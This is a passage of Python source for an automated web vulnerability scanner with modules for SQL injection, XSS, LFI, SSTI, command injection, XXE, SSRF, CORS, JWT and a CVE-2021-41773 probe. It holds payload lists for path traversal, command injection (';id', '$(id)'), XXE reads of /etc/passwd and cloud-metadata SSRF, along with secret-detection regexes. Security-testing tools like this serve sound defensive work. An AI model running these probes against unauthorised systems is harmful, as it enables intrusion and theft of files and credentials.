                        dbms = self._match_error(resp.text)
                        if dbms:
                            self.state.add(Finding(
                                vuln_type="SQL Injection (Error-Based, URL path)",
                                severity="Critical", url=test_url,
                                parameter=f"path-segment-{i}", payload=payload,
                                evidence=f"DBMS signature: {dbms}",
                                detail="Numeric URL path segment is SQL-injectable.",
                                cvss_hint=9.8,
                            ))
                            break

    def run(self) -> None:
        # Query-string params
        for url, params in list(self.state.params.items()):
            if params:
                self.scan_params(url, sorted(params), method="GET")
        # Forms
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            if not names:
                continue
            base = {n: "test" for n in names}
            self.scan_params(form["url"], names, method=form["method"], base_params=base)
        # Path-based IDs
        for url in list(self.state.crawled_urls):
            self.scan_path(url)


# ============================================================================
# Module 3 — Reflected XSS
# ============================================================================
class XssScanner:
    def __init__(self, client: HttpClient, state: ScanState):
        self.client = client
        self.state = state

    @staticmethod
    def _is_reflected(payload: str, body: str) -> Tuple[bool, bool]:
        """Returns (raw_reflected, executable).

        Executable requires the payload to appear VERBATIM (unescaped) —
        an HTML-escaped reflection is NOT XSS and must not be reported
        as executable (this killed false positives on real sites)."""
        raw = payload in body
        escaped = (html.escape(payload) in body) or (urllib.parse.quote(payload) in body)
        looks_active = any(t in payload.lower() for t in
                           ("<script", "<img", "<svg", "onerror", "onload",
                            "ontoggle", "<iframe", "javascript:", "<body"))
        exec_ = raw and (looks_active or bool(XSS_CONFIRM_RX.search(body)))
        return (raw or escaped), exec_

    def _test_target(self, url: str, method: str, param: str,
                     base_params: Dict[str, str]) -> None:
        parsed = urllib.parse.urlsplit(url)
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        for payload in XSS_PAYLOADS:
            params = dict(base_params)
            params[param] = payload
            if method.upper() == "GET":
                resp = self.client.get(clean, params=params)
            else:
                resp = self.client.request("POST", clean, data=params)
            if resp is None:
                continue
            raw, exec_ = self._is_reflected(payload, resp.text)
            if exec_:
                self.state.add(Finding(
                    vuln_type="Reflected XSS (Executable)",
                    severity="High", url=url, parameter=param, payload=payload,
                    evidence="payload reflected and rendered as active HTML/JS",
                    detail="The application reflects user input into the page without "
                           "adequate encoding — script execution is possible.",
                    cvss_hint=7.4,
                ))
                return
            if raw:
                self.state.add(Finding(
                    vuln_type="Reflected XSS (Reflected, encoding dependent)",
                    severity="Medium", url=url, parameter=param, payload=payload,
                    evidence="payload reflected verbatim into the response body",
                    detail="Input is reflected without sanitization; exploitability depends "
                           "on where it lands in the HTML context.",
                    cvss_hint=5.4,
                ))
                return

    def run(self) -> None:
        for url, params in list(self.state.params.items()):
            if params:
                info(f"XSS tests on {url} params={sorted(params)}")
                self._test_target(url, "GET", sorted(params)[0], {p: "1" for p in params})
                for p in sorted(params)[1:]:
                    self._test_target(url, "GET", p, {q: "1" for q in params})
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            if not names:
                continue
            info(f"XSS tests on form {form['url']} ({form['method']})")
            for n in names:
                self._test_target(form["url"], form["method"], n,
                                  {x: "test" for x in names})


# ============================================================================
# Module 4 — Directory brute-force
# ============================================================================
class DirBuster:
    def __init__(self, client: HttpClient, state: ScanState, wordlist: List[str]):
        self.client = client
        self.state = state
        self.wordlist = wordlist

    def run(self, base: str) -> None:
        base = base if base.endswith("/") else base + "/"
        info(f"Directory brute-force: {len(self.wordlist)} entries")
        interesting = {200, 201, 204, 301, 302, 307, 401, 403, 500}
        workers = getattr(self.client, "workers", 3)
        if workers <= 1:
            for word in self.wordlist:
                self._hit(base, word, interesting)
            return
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(self._hit, base, word, interesting)
                    for word in self.wordlist]
            for _ in as_completed(futs):
                pass

    def _hit(self, base, word, interesting):
            url = urllib.parse.urljoin(base, word.strip().lstrip("/"))
            resp = self.client.get(url, allow_redirects=False)
            if resp is None:
                return
            if resp.status_code in interesting:
                size = len(resp.content)
                loc = resp.headers.get("Location", "")
                note = f" -> {loc}" if loc else ""
                sev = "Medium" if resp.status_code in (200, 201, 500) else "Low"
                # .git/.env/backup hits are higher severity
                if any(x in word for x in (".git", ".env", ".aws", "id_rsa",
                                           "dump.sql", "backup", ".htaccess",
                                           "web.config", "phpinfo")):
                    sev = "High" if resp.status_code == 200 else "Medium"
                self.state.add(Finding(
                    vuln_type="Sensitive Path Exposed" if sev in ("High", "Medium")
                              else "Hidden Path Found",
                    severity=sev, url=url,
                    evidence=f"HTTP {resp.status_code}, {size} bytes{note}",
                    detail="A potentially sensitive or hidden resource is accessible.",
                    cvss_hint=5.0 if sev == "High" else 3.0,
                ))


# ============================================================================
# Module 5 — Security misconfiguration audit
# ============================================================================
class MisconfigAudit:
    def __init__(self, client: HttpClient, state: ScanState):
        self.client = client
        self.state = state

    def run(self, base: str) -> None:
        info("Auditing security headers & cookies")
        resp = self.client.get(base)
        if resp is None:
            return

        for header, desc in SEC_HEADERS.items():
            if header not in resp.headers:
                self.state.add(Finding(
                    vuln_type="Missing Security Header", severity="Low", url=base,
                    parameter=header, evidence=f"{header} not present",
                    detail=desc, cvss_hint=3.0,
                ))

        srv = resp.headers.get("Server", "")
        if srv:
            self.state.add(Finding(
                vuln_type="Server Banner Disclosure", severity="Info", url=base,
                evidence=f"Server: {srv}",
                detail="The server discloses its software/version — aids targeted attacks.",
                cvss_hint=2.0,
            ))
        xp = resp.headers.get("X-Powered-By", "")
        if xp:
            self.state.add(Finding(
                vuln_type="Technology Disclosure", severity="Info", url=base,
                evidence=f"X-Powered-By: {xp}",
                detail="Framework/technology fingerprint exposed.",
                cvss_hint=2.0,
            ))

        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:
                issues.append("missing Secure")
            if "httponly" not in str(getattr(cookie, "_rest", {})).lower() \
               and not getattr(cookie, "has_nonstandard_attr", lambda *_: False)("HttpOnly"):
                issues.append("missing HttpOnly")
            if issues:
                self.state.add(Finding(
                    vuln_type="Insecure Cookie Flags", severity="Low", url=base,
                    parameter=cookie.name,
                    evidence=f"Set-Cookie '{cookie.name}': {', '.join(issues)}",
                    detail="Cookies without Secure/HttpOnly flags are exposed to theft.",
                    cvss_hint=3.5,
                ))

        # HTTP methods
        for method in ("OPTIONS", "TRACE", "PUT", "DELETE"):
            r = self.client.request(method, base)
            if r is not None and r.status_code in (200, 204, 501) and method in ("TRACE", "PUT", "DELETE"):
                self.state.add(Finding(
                    vuln_type="Dangerous HTTP Method Enabled", severity="Medium",
                    url=base, parameter=method,
                    evidence=f"{method} allowed (HTTP {r.status_code})",
                    detail="Verb tampering / cross-site tracing may be possible.",
                    cvss_hint=5.0,
                ))

        # robots.txt / security.txt
        for path in ("robots.txt", "security.txt", ".well-known/security.txt"):
            r = self.client.get(urllib.parse.urljoin(base, path))
            if r is not None and r.status_code == 200 and r.text.strip():
                self.state.add(Finding(
                    vuln_type="Information File Present", severity="Info",
                    url=urllib.parse.urljoin(base, path),
                    evidence=f"{len(r.text)} bytes — may leak hidden paths",
                    detail="Review contents for sensitive directory disclosure.",
                    cvss_hint=1.0,
                ))


# ============================================================================
# Module 6 — Parameter discovery (the key to finding vulns on real sites)
# ============================================================================
PARAM_MARKER = "d4rk8f3a1c"          # random-looking reflection marker
COMMON_PARAMS = [
    "id", "page", "q", "search", "cat", "file", "path", "name", "user",
    "url", "redirect", "template", "cmd", "exec", "lang", "view", "item",
    "debug", "callback", "return", "next", "sort", "order", "filter",
    "type", "query", "s", "keyword", "input", "data", "content", "email",
    "username", "token", "doc", "folder", "dir", "root", "include", "site",
]


class ParamFuzzer:
    """Discovers hidden/undocumented parameters by probing each candidate
    and checking for reflection or significant response change."""

    def __init__(self, client: HttpClient, state: ScanState, max_pages: int = 25):
        self.client = client
        self.state = state
        self.max_pages = max_pages

    def run(self) -> None:
        info("Parameter discovery (hidden parameter fuzzing)")
        found = 0
        for url in list(self.state.crawled_urls)[: self.max_pages]:
            existing = self.state.params.get(url, set())
            if len(existing) >= 2:
                continue
            parsed = urllib.parse.urlsplit(url)
            clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
            base_resp = self.client.get(clean)
            if base_resp is None:
                continue
            base_len = len(base_resp.text)
            for p in COMMON_PARAMS:
                if p in existing:
                    continue
                resp = self.client.get(clean, params={p: PARAM_MARKER})
                if resp is None:
                    continue
                if PARAM_MARKER in resp.text:
                    self.state.params.setdefault(url, set()).add(p)
                    found += 1
                elif abs(len(resp.text) - base_len) > 120:
                    self.state.params.setdefault(url, set()).add(p)
                    found += 1
        ok(f"Parameter discovery: {found} active parameter(s) found")


# ============================================================================
# Module 7 — Advanced vulnerability checks
# ============================================================================
LFI_PAYLOADS = [
    ("../../../../etc/passwd", re.compile(r"root:.*:0:0:")),
    ("....//....//....//....//etc/passwd", re.compile(r"root:.*:0:0:")),
    ("..%2f..%2f..%2f..%2fetc/passwd", re.compile(r"root:.*:0:0:")),
    ("..%252f..%252f..%252f..%252fetc/passwd", re.compile(r"root:.*:0:0:")),
    ("....\\\\....\\\\....\\\\windows/win.ini", re.compile(r"\[fonts\]")),
    ("../../../../windows/win.ini", re.compile(r"\[fonts\]")),
    ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
    ("php://filter/convert.base64-encode/resource=index", re.compile(r"PD9waH|cGhw")),
    ("php://filter/convert.base64-encode/resource=index.php", re.compile(r"PD9waH|cGhw")),
    ("/proc/self/environ", re.compile(r"PATH=|SHELL=")),
    ("/etc/passwd%00", re.compile(r"root:.*:0:0:")),
    ("..../..../..../etc/passwd", re.compile(r"root:.*:0:0:")),
]
LFI_PARAM_NAMES = {"file", "path", "page", "doc", "folder", "dir", "root",
                   "include", "template", "view", "name", "lang", "item",
                   "document", "pg", "p", "content", "cat", "dir", "locate"}

SSTI_PAYLOADS = [
    ("{{1337*2}}", "2674"),          # Jinja2 / Twig / Nunjucks
    ("${1337*2}", "2674"),           # Java / Freemarker / EL
    ("<%=1337*2%>", "2674"),         # ERB / ASP
    ("#{1337*2}", "2674"),           # Ruby
    ("{{7*'7'}}", "7777777"),        # Jinja2 string repeat
    ("${{1337*2}}", "2674"),         # Twig alt
    ("*{1337*2}", "2674"),           # Pebble
]

CMDI_PAYLOADS = [
    (";id", re.compile(r"uid=\d+\([^)]+\)")),
    ("|id", re.compile(r"uid=\d+\([^)]+\)")),
    ("`id`", re.compile(r"uid=\d+\([^)]+\)")),
    ("$(id)", re.compile(r"uid=\d+\([^)]+\)")),
    (";id;", re.compile(r"uid=\d+\([^)]+\)")),
    ("\nid\n", re.compile(r"uid=\d+\([^)]+\)")),
    ("& type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
    ("| type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
]
CMDI_TIME = [("1; sleep 2", 2.0), ("1 | sleep 2", 2.0),
             ("1 & ping -n 3 127.0.0.1", 2.0)]
CMDI_PARAM_NAMES = {"cmd", "exec", "command", "ping", "host", "ip", "q",
                    "run", "shell", "process", "daemon"}

OPEN_REDIRECT_PARAMS = {"url", "redirect", "redir", "next", "return",
                        "returnto", "return_url", "goto", "dest", "destination",
                        "continue", "target", "link", "rurl", "site", "view"}
OPEN_REDIRECT_PAYLOADS = [
    "https://dark-redirect-check.example",
    "//dark-redirect-check.example",
    "/\\dark-redirect-check.example",
    "https:dark-redirect-check.example",
]

CRLF_PAYLOAD = "%0d%0aX-DARK-Injected:%201"

DIR_LISTING_RX = re.compile(r"Index of /|Directory listing for /|<title>Index of", re.I)

JS_LIBS = [
    (re.compile(r"jquery[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "jQuery",
     lambda a, b, c: (a, b, c) < (3, 5, 0), "CVE-2020-11022/11023 XSS"),
    (re.compile(r"angular[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "AngularJS",
     lambda a, b, c: (a, b, c) < (1, 8, 0), "Sandbox escapes / XSS"),
    (re.compile(r"bootstrap[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Bootstrap",
     lambda a, b, c: (a, b, c) < (3, 4, 0), "XSS in tooltip/data attributes"),
    (re.compile(r"lodash[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Lodash",
     lambda a, b, c: (a, b, c) < (4, 17, 21), "Prototype pollution"),
    (re.compile(r"handlebars[.\-/](\d+)\.(\d+)\.(\d+)", re.I), "Handlebars",
     lambda a, b, c: (a, b, c) < (4, 7, 7), "Prototype pollution RCE"),
]

SENSITIVE_RX = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key ID", "Critical"),
    (re.compile(r"ghp_[A-Za-z0-9]{36}"), "GitHub personal access token", "Critical"),
    (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "Private key material", "Critical"),
    (re.compile(r'"password"\s*:\s*"[^"\s]{3,}"'), "Password inside JSON/JS", "High"),
    (re.compile(r"(?i)(api[_-]?key|apikey|secret)\s*[:=]\s*['\"][^'\"]{8,}['\"]"),
     "Hard-coded API key / secret", "High"),
    (re.compile(r"slack\.com/api/(?:services/)?[A-Za-z0-9/_\-]{10,}"), "Slack webhook/token", "High"),
    (re.compile(r"[\w.+-]+@[\w-]+\.[\w.]{2,}"), "Email address", "Info"),
]


class AdvancedScanner:
    """Second-wave vulnerability modules for broader coverage."""

    def __init__(self, client: HttpClient, state: ScanState):
        self.client = client
        self.state = state

    # -- helpers -------------------------------------------------------------
    def _all_params(self):
        """Yield (url, method, param, base_params) for every known parameter."""
        for url, params in list(self.state.params.items()):
            for p in sorted(params):
                yield url, "GET", p, {q: "1" for q in params}
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            for n in names:
                yield form["url"], form["method"], n, {x: "test" for x in names}

    @staticmethod
    def _clean(url: str) -> str:
        p = urllib.parse.urlsplit(url)
        return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, "", ""))

    def _send(self, url, method, param, value, base_params, follow=True):
        params = dict(base_params)
        params[param] = value
        if method.upper() == "GET":
            return self.client.request("GET", self._clean(url), params=params,
                                       allow_redirects=follow)
        return self.client.request("POST", self._clean(url), data=params,
                                   allow_redirects=follow)

    # -- LFI / path traversal ------------------------------------------------
    def scan_lfi(self) -> None:
        info("LFI / Path Traversal tests")
        tested = set()
        for url, method, param, base in self._all_params():
            pname = param.lower()
            if pname not in LFI_PARAM_NAMES and not re.search(
                    r"\.(php|asp|jsp|html|txt|inc|cfg|ini|log)$",
                    str(base.get(param, "")), re.I):
                continue
            key = (url, param)
            if key in tested:
                continue
            tested.add(key)
            for payload, rx in LFI_PAYLOADS:
                resp = self._send(url, method, param, payload, base)
                if resp is not None and rx.search(resp.text):
                    self.state.add(Finding(
                        vuln_type="Local File Inclusion / Path Traversal",
                        severity="Critical", url=url, parameter=param,
                        payload=payload, evidence="server returned file system content",
                        detail="User input is used to read files — an attacker can "
                               "exfiltrate /etc/passwd, source code, and secrets.",
                        cvss_hint=8.6,
                    ))
                    break

    # -- SSTI ----------------------------------------------------------------
    def scan_ssti(self) -> None:
        info("SSTI (template injection) tests")
        for url, method, param, base in self._all_params():
            for payload, expect in SSTI_PAYLOADS:
                resp = self._send(url, method, param, payload, base)
                if resp is None:
                    continue
                rx = re.compile(r"(?<!\d)" + re.escape(expect) + r"(?!\d)")
                if expect == "7777777":
                    ok_rx = re.compile(r"7777777")
                else:
                    ok_rx = rx
                if ok_rx.search(resp.text) and payload[:2] + "1337*2" not in resp.text \
                   and payload not in resp.text:
                    self.state.add(Finding(
                        vuln_type="Server-Side Template Injection (SSTI)",
                        severity="Critical", url=url, parameter=param,
                        payload=payload,
                        evidence=f"expression evaluated: {payload} -> {expect}",
                        detail="Template expression was evaluated server-side — "
                               "often leads to remote code execution.",
                        cvss_hint=9.0,
                    ))
                    break

    # -- Command injection ---------------------------------------------------
    def scan_cmdi(self) -> None:
        info("Command injection tests")
        for url, method, param, base in self._all_params():
            if param.lower() not in CMDI_PARAM_NAMES:
                continue
            hit = False
            for payload, rx in CMDI_PAYLOADS:
                resp = self._send(url, method, param, payload, base)
                if resp is not None and rx.search(resp.text):
                    self.state.add(Finding(
                        vuln_type="OS Command Injection",
                        severity="Critical", url=url, parameter=param,
                        payload=payload, evidence="command output reflected in response",
                        detail="Shell metacharacters in input are executed — full "
                               "server compromise is possible.",
                        cvss_hint=9.8,
                    ))
                    hit = True
                    break
            if hit:
                continue
            # Blind (time-based) — catches cmds whose output is not echoed
            for payload, need in CMDI_TIME:
                t0 = time.time()
                self._send(url, method, param, payload, base)
                if time.time() - t0 >= need - 0.4:
                    t1 = time.time()
                    self._send(url, method, param, payload, base)
                    if time.time() - t1 >= need - 0.4:
                        self.state.add(Finding(
                            vuln_type="OS Command Injection",
                            severity="Critical", url=url, parameter=param,
                            payload=payload,
                            evidence=f"response delayed twice (≥{need}s) on sleep/ping",
                            detail="Blind command injection: the server waits only "
                                   "when a shell sleep is injected.",
                            cvss_hint=9.8,
                        ))
                        break

    # -- Open redirect -------------------------------------------------------
    def scan_open_redirect(self) -> None:
        info("Open redirect tests")
        tested = set()
        for url, method, param, base in self._all_params():
            if param.lower() not in OPEN_REDIRECT_PARAMS:
                continue
            key = (url, param)
            if key in tested:
                continue
            tested.add(key)
            # Do NOT follow redirects — we need the raw 3xx + Location header
            for payload in OPEN_REDIRECT_PAYLOADS:
                resp = self._send(url, method, param, payload, base, follow=False)
                if resp is None:
                    continue
                loc = resp.headers.get("Location", "")
                blob = loc or resp.text[:3000]
                if "dark-redirect-check.example" in blob:
                    self.state.add(Finding(
                        vuln_type="Open Redirect",
                        severity="Medium", url=url, parameter=param,
                        payload=payload,
                        evidence=f"redirects to attacker URL (Location: {loc[:80] or 'in body'})",
                        detail="Open redirects enable phishing and token theft chains.",
                        cvss_hint=6.1,
                    ))
                    break

    # -- CORS ----------------------------------------------------------------
    def scan_cors(self) -> None:
        info("CORS misconfiguration tests")
        evil = "https://dark-cors-check.example"
        for url in list(self.state.crawled_urls)[:25]:
            resp = self.client.get(url, headers={"Origin": evil})
            if resp is None:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == evil or (acao == "*" and acac.lower() == "true"):
                self.state.add(Finding(
                    vuln_type="CORS Misconfiguration",
                    severity="Medium", url=url,
                    payload=f"Origin: {evil}",
                    evidence=f"ACAO: {acao} | ACAC: {acac or '-'}",
                    detail="Any website can read authenticated responses from this "
                           "origin — enables cross-site data theft.",
                    cvss_hint=6.5,
                ))

    # -- CRLF ----------------------------------------------------------------
    def scan_crlf(self) -> None:
        info("CRLF / header injection tests")
        for url in list(self.state.crawled_urls)[:15]:
            p = urllib.parse.urlsplit(url)
            for inj_path in (p.path + CRLF_PAYLOAD,):
                inj_url = urllib.parse.urlunsplit(
                    (p.scheme, p.netloc, inj_path, p.query, ""))
                resp = self.client.get(inj_url)
                if resp is not None and "X-DARK-Injected" in "".join(
                        f"{k}: {v}\n" for k, v in resp.headers.items()):
                    self.state.add(Finding(
                        vuln_type="CRLF / HTTP Header Injection",
                        severity="Medium", url=url,
                        payload=CRLF_PAYLOAD,
                        evidence="injected header appears in the response",
                        detail="CRLF injection enables response splitting, cache "
                               "poisoning and session fixation.",
                        cvss_hint=6.1,
                    ))
                    return

    # -- Directory listing ---------------------------------------------------
    def scan_dir_listing(self) -> None:
        info("Directory listing tests")
        for url in list(self.state.crawled_urls):
            resp = self.client.get(url)
            if resp is not None and DIR_LISTING_RX.search(resp.text[:2000]):
                self.state.add(Finding(
                    vuln_type="Directory Listing Enabled",
                    severity="Medium", url=url,
                    evidence="server renders an index of directory contents",
                    detail="Directory listings leak files, backups and structure.",
                    cvss_hint=5.3,
                ))

    # -- Vulnerable JS libraries --------------------------------------------
    def scan_js_libs(self) -> None:
        info("Vulnerable JavaScript library tests")
        blobs = set()
        for url in list(self.state.crawled_urls)[:30]:
            resp = self.client.get(url)
            if resp is not None:
                blobs.add(resp.text)
        seen = set()
        for body in blobs:
            for rx, name, is_vuln, cve in JS_LIBS:
                for m in rx.finditer(body):
                    ver = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
                    if is_vuln(*ver) and (name, ver) not in seen:
                        seen.add((name, ver))
                        self.state.add(Finding(
                            vuln_type="Outdated / Vulnerable JS Library",
                            severity="Medium", url=self.state.base_url,
                            parameter=name,
                            evidence=f"{name} {'.'.join(map(str, ver))} — {cve}",
                            detail="Known-vulnerable frontend library version detected.",
                            cvss_hint=5.0,
                        ))

    # -- Sensitive data exposure ---------------------------------------------
    def scan_sensitive(self) -> None:
        info("Sensitive data exposure tests")
        seen = set()
        for url in list(self.state.crawled_urls)[:40]:
            resp = self.client.get(url)
            if resp is None:
                continue
            for rx, name, sev in SENSITIVE_RX:
                if name in seen and sev != "Info":
                    continue
                matches = rx.findall(resp.text)
                if not matches:
                    continue
                if name == "Email address":
                    uniq = set(m if isinstance(m, str) else m[0] for m in matches)
                    if len(uniq) < 3:
                        continue
                    evidence = f"{len(uniq)} addresses (e.g. {sorted(uniq)[0]})"
                    seen.add(name)
                    self.state.add(Finding(
                        vuln_type="Information Disclosure", severity="Info",
                        url=url, parameter=name, evidence=evidence,
                        detail="Email addresses exposed in page source — aids "
                               "social engineering and user enumeration.",
                        cvss_hint=2.0,
                    ))
                    continue
                seen.add(name)
                first = matches[0]
                ev = first if isinstance(first, str) else first[0]
                self.state.add(Finding(
                    vuln_type="Sensitive Data Exposure", severity=sev,
                    url=url, parameter=name,
                    evidence=(ev[:60] + "...") if len(ev) > 60 else ev,
                    detail="Hard-coded secrets/credentials in client-side code "
                           "can be extracted by anyone.",
                    cvss_hint=8.0 if sev == "Critical" else 5.5,
                ))

    # -- Known-vulnerable server versions + CVE probes ----------------------
    KNOWN_VULN_VERSIONS = [
        # (header_regex, condition, name, detail)
        (re.compile(r"Apache/2\.4\.(49|50)", re.I), "Apache 2.4.49/2.4.50",
         "Apache path traversal & RCE (CVE-2021-41773 / CVE-2021-42013)"),
        (re.compile(r"Apache/2\.4\.(1[0-9]|2[0-9]|3[0-9]|4[0-8])\b", re.I), "Apache < 2.4.49",
         "Multiple known CVEs — outdated Apache"),
        (re.compile(r"nginx/1\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)\b", re.I), "nginx < 1.17",
         "Outdated nginx with known CVEs"),
        (re.compile(r"OpenSSL/1\.0\.|OpenSSL/0\.", re.I), "OpenSSL 1.0.x / 0.x",
         "EOL OpenSSL — Heartbleed-era code base"),
        (re.compile(r"PHP/5\.|PHP/7\.[0-3]\b", re.I), "PHP 5.x / 7.0-7.3",
         "End-of-life PHP with unpatched CVEs"),
        (re.compile(r"Microsoft-IIS/[67]\.", re.I), "IIS 6/7",
         "Legacy IIS — known remote code execution CVEs"),
        (re.compile(r"OpenSSH_[1-7]\.\d", re.I), "OpenSSH < 8.0",
         "Outdated SSH daemon with known CVEs"),
    ]
    CVE_2021_41773_PATHS = [
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
    ]

    def scan_known_vulns(self) -> None:
        info("Known-vulnerable version tests (CVE database)")
        resp = self.client.get(self.state.base_url)
        if resp is None:
            return
        blob = "; ".join(f"{k}: {v}" for k, v in resp.headers.items())
        seen = set()
        for rx, name, detail in self.KNOWN_VULN_VERSIONS:
            m = rx.search(blob)
            if m and name not in seen:
                seen.add(name)
                self.state.add(Finding(
                    vuln_type="Known-Vulnerable Software Version",
                    severity="High", url=self.state.base_url, parameter=name,
                    evidence=m.group(0),
                    detail=detail + " — verify and patch immediately.",
                    cvss_hint=7.5,
                ))
        # Direct CVE-2021-41773 / 42013 exploit probe (precise, zero FP)
        for path in self.CVE_2021_41773_PATHS:
            target = urllib.parse.urljoin(self.state.base_url, path)
            r = self.client.get(target)
            if r is not None and re.search(r"root:.*:0:0:", r.text):
                self.state.add(Finding(
                    vuln_type="Apache Path Traversal RCE (CVE-2021-41773/42013)",
                    severity="Critical", url=target,
                    evidence="server returned /etc/passwd via traversal payload",
                    detail="Unpatched Apache 2.4.49/50 allows path traversal and "
                           "remote code execution — full server compromise.",
                    cvss_hint=10.0,
                ))
                break

    # -- CSRF (missing anti-CSRF tokens) ------------------------------------
    CSRF_RX = re.compile(r"csrf|xsrf|_token|authenticity_token|anti[_-]?forgery",
                         re.I)

    def scan_csrf(self) -> None:
        info("CSRF protection tests (forms)")
        for form in self.state.forms:
            if form.get("method", "get").lower() != "post":
                continue
            names = {i["name"].lower() for i in form["inputs"] if i["name"]}
            has_token = any(self.CSRF_RX.search(n) for n in names)
            if not has_token:
                self.state.add(Finding(
                    vuln_type="CSRF — Missing Anti-CSRF Token",
                    severity="Medium", url=form.get("url", self.state.base_url),
                    evidence=f"POST form without any CSRF token field "
                             f"(inputs: {sorted(names) or 'none'})",
                    detail="State-changing form has no CSRF protection — cross-site "
                           "request forgery attacks are possible.",
                    cvss_hint=5.8,
                ))

    # -- XXE ----------------------------------------------------------------
    XXE_PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
         "<r>&x;</r>", re.compile(r"root:.*:0:0:")),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
         "<r>&x;</r>", re.compile(r"\[fonts\]", re.I)),
    ]

    def scan_xxe(self) -> None:
        info("XXE (XML external entity) tests")
        candidates = set()
        for form in self.state.forms:
            candidates.add(form.get("url", ""))
        for url in list(self.state.crawled_urls)[:15]:
            low = url.lower()
            if any(k in low for k in ("xml", "soap", "import", "upload", "feed", "api")):
                candidates.add(url)
        for url in [c for c in candidates if c][:10]:
            for payload, rx in self.XXE_PAYLOADS:
                r = self.client.request("POST", url, data=payload.encode(),
                                        headers={"Content-Type": "application/xml"})
                if r is not None and rx.search(r.text):
                    self.state.add(Finding(
                        vuln_type="XML External Entity (XXE)",
                        severity="Critical", url=url,
                        payload="DOCTYPE ENTITY file disclosure",
                        evidence="server resolved an external XML entity",
                        detail="XML parser processes external entities — local file "
                               "disclosure and SSRF.",
                        cvss_hint=9.0,
                    ))
                    return

    # -- SSRF ---------------------------------------------------------------
    SSRF_PARAM_NAMES = {"url", "uri", "fetch", "proxy", "link", "src", "dest",
                        "path", "site", "feed", "callback", "domain", "host",
                        "image", "img", "load", "redirect"}
    SSRF_PAYLOADS = [
        ("http://127.0.0.1:1", re.compile(r"connection refused|failed to connect|"
                                          r"actively refused|ECONNREFUSED|timed out", re.I)),
        ("http://localhost:1", re.compile(r"connection refused|failed to connect|"
                                          r"actively refused|ECONNREFUSED|timed out", re.I)),
        ("http://[::1]:1", re.compile(r"connection refused|failed to connect|"
                                      r"actively refused|ECONNREFUSED|timed out", re.I)),
        ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
        ("http://169.254.169.254/latest/meta-data/",
         re.compile(r"ami-id|instance-id|iam/|local-ipv4|security-credentials", re.I)),
    ]

    def scan_ssrf(self) -> None:
        info("SSRF tests")
        tested = set()
        for url, method, param, base in self._all_params():
            if param.lower() not in self.SSRF_PARAM_NAMES:
                continue
            key = (url, param)
            if key in tested:
                continue
            tested.add(key)
            for payload, rx in self.SSRF_PAYLOADS:
                resp = self._send(url, method, param, payload, base)
                if resp is not None and rx.search(resp.text):
                    self.state.add(Finding(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        severity="High", url=url, parameter=param,
                        payload=payload,
                        evidence="server made a request to an attacker-controlled target",
                        detail="The server fetches attacker-supplied URLs — internal "
                               "network scanning and cloud metadata theft are possible.",
                        cvss_hint=8.5,
                    ))
                    break

    # -- Host header injection ----------------------------------------------
    def scan_host_header(self) -> None:
        info("Host header injection tests")
        evil = "dark-host-check.example"
        for url in list(self.state.crawled_urls)[:10]:
            r = self.client.get(url, headers={"Host": evil})
            if r is None:
                continue
            loc = r.headers.get("Location", "")
            if evil in loc or (evil in r.text and evil not in url):
                self.state.add(Finding(
                    vuln_type="Host Header Injection",
                    severity="Medium", url=url,
                    payload=f"Host: {evil}",
                    evidence=f"attacker host reflected in {'Location' if evil in loc else 'response body'}",
                    detail="Host header is trusted — enables password-reset poisoning "
                           "and cache poisoning chains.",
                    cvss_hint=6.5,
                ))

    # -- JWT weaknesses ------------------------------------------------------
    JWT_RX = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*")

    def scan_jwt(self) -> None:
        info("JWT analysis tests")
        seen = set()
        for url in list(self.state.crawled_urls)[:15]:
            r = self.client.get(url)
            if r is None:
                continue
            blobs = [r.text, "; ".join(f"{k}={v}" for k, v in r.headers.items()),
                     "; ".join(f"{c.name}={c.value}" for c in r.cookies)]
            for blob in blobs:
                for m in self.JWT_RX.finditer(blob):
                    token = m.group(0)
                    if token in seen:
                        continue
                    seen.add(token)
                    parts = token.split(".")
                    try:
                        header = json.loads(base64.urlsafe_b64decode(
                            parts[0] + "=" * (-len(parts[0]) % 4)))
                    except Exception:
                        header = {}
                    issues = []
                    if str(header.get("alg", "")).lower() == "none":
                        issues.append("algorithm 'none' (signature bypass)")
                    if len(parts) > 2 and not parts[2]:
                        issues.append("empty signature")
                    if issues:
                        self.state.add(Finding(
                            vuln_type="Weak / Tamperable JWT",
                            severity="High", url=url,
